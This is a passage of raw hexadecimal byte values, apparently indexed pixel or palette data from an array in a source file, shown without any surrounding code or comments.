0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0xC9, 0xE0, 0xE1, 0xE1, 0xE1, 0xE2, 0xE0, 0xE0, 0xE1, 0xE3, 0x14, 0x14,
0xE3, 0xE3, 0xE2, 0xE2, 0xE2, 0xE1, 0xC9, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0xC9, 0xC9, 0xE0, 0xE3, 0x08, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4,
0xE4, 0xE4, 0xE4, 0xE4, 0xCE, 0x12, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4,
0xE4, 0xE4, 0xE4, 0xE4, 0xE3, 0x13, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0xCE, 0xCE, 0xE6,
0xE7, 0xCE, 0xCE, 0xCE, 0xCE, 0xCF, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12,
0x12, 0x11, 0x11, 0x11, 0x00, 0x00, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x12, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0xE4, 0xE4, 0xE4, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4,
0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE3, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0x14, 0xE4, 0xE3, 0xE4,
0xE4, 0xE4, 0xE4, 0xE4, 0x13, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0x14, 0x9D, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C,
0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9B,
0x08, 0x14, 0xE4, 0xCA, 0x12, 0x12, 0xC9, 0xC9, 0xC9, 0xC9, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x11, 0x11, 0x11, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0xE0, 0xE1, 0xE0, 0xC9, 0xE0, 0xC9, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0xC9, 0xE0, 0xE2, 0x08, 0x08, 0xE4, 0xE4, 0xE4, 0xE5, 0xE5, 0xE5, 0xE5, 0xE5,
0xE4, 0xE4, 0x14, 0xE5, 0xCF, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xCA, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0xE4, 0xE3, 0xE2, 0xCA, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0xCF, 0xCE, 0xE6, 0xE6,
0xE7, 0xE7, 0xCE, 0xCE, 0xCE, 0xCF, 0x12, 0x11, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12,
0x11, 0x11, 0x11, 0x11, 0x00, 0x11, 0x11, 0x12, 0xCF, 0xCF, 0xE8, 0xE8, 0xE8, 0xE8, 0xE8, 0xE8,
0xE7, 0xE6, 0xE6, 0xE6, 0x12, 0x12, 0x13, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0xE4, 0x14, 0xE4, 0x12, 0x11, 0x11, 0x12, 0x13, 0xE8, 0xCF, 0xE8, 0xCF, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE5, 0xE3, 0x13, 0x13, 0xE0, 0xCA,
0xCA, 0xCA, 0xCA, 0x12, 0x12, 0x12, 0x14, 0x08, 0x9E, 0x9F, 0x9E, 0x9D, 0x9C, 0x9C, 0x9C, 0x9D,
0x9D, 0x9E, 0x9E, 0x9D, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9A,
0x14, 0xE2, 0xC9, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC9, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x12,
0x12, 0x12, 0x12, 0xC9, 0xE0, 0xE2, 0x08, 0x9A, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x9F, 0x08, 0x08, 0xE6, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08,
0x08, 0x08, 0x14, 0xE4, 0xE5, 0xCE, 0x12, 0x11, 0x11, 0x11, 0x12, 0xCF, 0xCE, 0xE6, 0xE6, 0xE6,
0xE6, 0xE6, 0xE6, 0xE6, 0xE5, 0xE6, 0x12, 0x11, 0x11, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE8, 0xE6, 0xE6, 0xE6, 0xE6, 0xE7, 0xE8, 0xE8, 0xE8,
0xE8, 0xE8, 0xE7, 0xE8, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xCA, 0xCA, 0xCA, 0x13, 0x13, 0x13, 0x13, 0x13,
0x13, 0x13, 0x13, 0x12, 0x11, 0x11, 0x12, 0x13, 0xE5, 0xE6, 0xE5, 0xE6, 0xCF, 0xCF, 0xCF, 0xCF,
0xCF, 0xCF, 0xCF, 0x13, 0xE5, 0x14, 0x08, 0x14, 0xE4, 0x13, 0x13, 0x13, 0x13, 0xE2, 0x13, 0xE0,
0xCA, 0x13, 0x13, 0x13, 0xCA, 0xCA, 0x14, 0x08, 0x9E, 0x9D, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17,
0x9C, 0x9E, 0x08, 0x08, 0x9B, 0x9D, 0x9B, 0x9B, 0x9A, 0x9B, 0x9B, 0x9B, 0x9C, 0x9C, 0x08, 0x14,
0xCA, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12,
0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0xC9, 0xE1, 0xE3, 0x08, 0x9B, 0x16, 0x9B, 0x9B, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x08, 0xCE, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0xCA, 0xE3, 0x14, 0x08, 0xE4, 0xCA, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x13,
0x14, 0x08, 0x08, 0x14, 0x12, 0x11, 0x11, 0xCE, 0x9F, 0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x9D, 0x9D,
0x9E, 0x9E, 0x9A, 0x08, 0x14, 0xE3, 0x12, 0x11, 0x11, 0x12, 0xCE, 0x14, 0x08, 0x08, 0x08, 0x08,
0x08, 0x14, 0x14, 0x14, 0x14, 0xE6, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x11, 0x00, 0x11,
0x11, 0x00, 0x00, 0x00, 0x11, 0x12, 0xE7, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE7, 0xE8, 0xE7, 0xE7,
0xE7, 0xE6, 0xE6, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xCF, 0xE6, 0xE6, 0xE6, 0xE6, 0xE8, 0x12, 0x12, 0xCF, 0xCF,
0xCF, 0xCF, 0xCF, 0xCF, 0x13, 0x13, 0x13, 0x13, 0x13, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x11, 0x11, 0x11, 0x11, 0x11, 0x13, 0x08, 0x16, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x9C, 0x9B, 0x9B, 0x9B, 0x9C, 0x9C, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9A, 0x14, 0xE2, 0xCA,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x11, 0x11, 0x12, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xE0, 0xE0, 0x12, 0x12, 0x12,
0x12, 0xE1, 0x14, 0x14, 0x14, 0x08, 0x16, 0x17, 0x17, 0x17, 0x9B, 0x9C, 0x9D, 0x9D, 0x9D, 0x9C,
0x9C, 0x16, 0x9E, 0x14, 0x12, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0xCA, 0xCA, 0x12, 0x12, 0x12, 0xE4, 0x9D, 0x9C, 0x9E, 0x9B, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x9E, 0x9A, 0x08, 0x08, 0xE3, 0x12, 0x11, 0x11, 0x12, 0xE4, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x14, 0x14, 0x14, 0x14, 0xE8, 0x11, 0x11, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE7, 0xE6, 0xE5, 0xE5, 0xE6, 0xE6, 0xE7, 0xE8, 0xE8, 0xE8,
0xE7, 0xE6, 0xE7, 0x12, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE7, 0xE6, 0xE6, 0xE6, 0xE7, 0xCF, 0x12, 0xCF, 0xCF, 0xCF,
0xCF, 0xCF, 0xE8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x11, 0x11, 0x11, 0x12, 0x14, 0x16, 0x17, 0x17, 0x17, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x16, 0x9A, 0x08, 0x08, 0x08, 0xE3, 0xCA, 0xCA, 0xC9,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xE1, 0x14, 0x99, 0x9A, 0x16,
0x17, 0x9A, 0x99, 0x17, 0x18, 0x19, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x07, 0x18, 0x17, 0x9B, 0x9B,
0x9B, 0x16, 0x16, 0x14, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x08, 0x9C, 0x9D, 0x9E, 0x9B, 0x9E, 0x9E, 0x9D, 0x9E,
0x9E, 0x9E, 0x08, 0x08, 0x14, 0xCF, 0x11, 0x11, 0x11, 0xCA, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08,
0x14, 0x14, 0x14, 0x14, 0x14, 0xCF, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0xCF, 0xE6, 0xE5, 0xE5, 0xE5, 0xE6, 0xE7, 0xE7, 0xE6, 0xE6, 0xE6,
0xE5, 0xE6, 0x12, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x11, 0x11, 0x11, 0x11, 0xE8, 0xE5, 0xE5, 0xE6, 0xE7, 0xE8, 0xCF, 0xD0, 0xD0, 0xCF, 0xE8,
0xE8, 0xE8, 0xE8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x11, 0x11, 0x11, 0x12, 0x14, 0x08, 0x08, 0x08, 0x08, 0x9A, 0x17, 0x17, 0x17, 0x17, 0x16,
0x9A, 0x08, 0x14, 0x14, 0x14, 0xE3, 0xE2, 0xE2, 0xE1, 0xCA, 0xCA, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12,
0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xDF,
0xE1, 0x14, 0x14, 0x98, 0x99, 0x9A, 0x16, 0x16, 0x16, 0x99, 0x99, 0x98, 0x99, 0x99, 0x9B, 0x16,
0x17, 0x17, 0x16, 0x9A, 0x08, 0x16, 0x9B, 0x9A, 0x14, 0xE3, 0xE3, 0x13, 0xE0, 0xE0, 0x13, 0x13,
0xE0, 0xC9, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x11, 0x12, 0xCA, 0x08, 0x9C, 0x9D, 0x9E, 0x9D, 0x9E, 0x9E, 0x9E, 0x9A,
0x08, 0x08, 0x08, 0x14, 0xE5, 0x12, 0x11, 0x11, 0x12, 0xE3, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x14, 0x14, 0x14, 0x14, 0xE5, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0xE6, 0xE5, 0xE5, 0xE5, 0xE5, 0xE6, 0xE7, 0xE7, 0xE7, 0xE7, 0xE7,
0xE6, 0xE6, 0x12, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xC9, 0xC9, 0xC9, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xCF, 0x12,
0x12, 0x11, 0x11, 0x11, 0x12, 0xE5, 0xE5, 0xE6, 0xE6, 0xE7, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xE8,
0xE7, 0xE7, 0xE7, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x11, 0x11, 0x11, 0x12, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0xE3, 0xE1, 0xE0,
0xE0, 0xC9, 0xC9, 0x12, 0xC9, 0xC9, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC9, 0xE0, 0xE0, 0xE1, 0x14,
0x98, 0x9A, 0x17, 0x17, 0x18, 0x18, 0x18, 0x19, 0x19, 0x07, 0x07, 0x07, 0x19, 0x19, 0x17, 0x16,
0x14, 0xE2, 0xE2, 0xE1, 0xE1, 0xE1, 0x13, 0x13, 0x13, 0xE0, 0xE0, 0x13, 0x13, 0x13, 0x13, 0x13,
0x13, 0x13, 0x13, 0x12, 0x12, 0x12, 0xE4, 0x9B, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D,
0x9B, 0x9E, 0x08, 0x14, 0x13, 0x12, 0x11, 0x11, 0x12, 0x14, 0x9A, 0x9A, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x14, 0xE7, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0xCF, 0xE6, 0xE5, 0xE5, 0xE6, 0xE7, 0xCE, 0xCF, 0xCF, 0xCF, 0xE8, 0xE7,
0xE7, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xCF, 0x12,
0x12, 0x11, 0x11, 0x12, 0xE7, 0xE5, 0xE6, 0xE6, 0xE7, 0xCF, 0x12, 0x12, 0x12, 0x12, 0xCF, 0xCF,
0xE8, 0xE8, 0xE7, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x12, 0x12, 0x12, 0x13, 0xE3, 0x14, 0x14, 0xE3, 0xE2, 0xE0, 0xC9, 0xC9, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC9, 0xC9, 0xC9, 0xC9, 0xE0, 0xE2, 0xE2, 0xE2, 0xE3, 0x14, 0x08, 0x99, 0x9A,
0x16, 0x16, 0x16, 0x16, 0x17, 0x17, 0x18, 0x18, 0x18, 0x16, 0x08, 0x14, 0x13, 0x13, 0x13, 0x13,
0x13, 0xE0, 0x13, 0x12, 0x12, 0x12, 0x14, 0x9D, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E,
0x08, 0x08, 0x08, 0xE5, 0x12, 0x11, 0x11, 0x11, 0xCE, 0x14, 0x9A, 0x9F, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x14, 0xE7, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xCF, 0xCF, 0xCF, 0xCF,
0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0x12, 0x12,
0x11, 0x11, 0x11, 0x12, 0x12, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0xCF, 0xE8, 0xE7, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0xE0, 0x13, 0xE2, 0xE2,
0x13, 0x13, 0x13, 0x13, 0xE0, 0xE0, 0xE0, 0xC9, 0xDF, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
